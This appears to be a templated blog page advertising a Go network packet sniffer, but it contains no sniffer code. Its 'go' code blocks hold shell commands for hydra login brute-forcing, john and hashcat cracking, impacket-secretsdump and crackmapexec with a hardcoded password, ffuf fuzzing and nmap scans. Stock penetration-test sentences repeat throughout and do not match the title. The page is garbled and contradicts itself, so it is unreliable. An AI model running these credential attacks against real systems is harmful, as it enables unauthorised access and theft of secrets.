---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "powershell, parser, go, rust, scanner"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-156.html"
URL_IMAGES: ""
Date: "2025-04-09"
Tags: "PowerShell, Parser, Go, Rust, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-156"
Permalink: "/scripting/script-network-packet-sniffer-156.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `netcat`
- `lookupsid`
- `wmiexec`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.120.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.127.48 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.107.177.185
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.78.29.201/FUZZ
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p443,995,8080 10.124.34.167 -oN scan.txt
crackmapexec smb 10.79.150.88 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.52.83 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.69.8.173 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p464,8888,636 10.82.40.254 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 18.06s
```
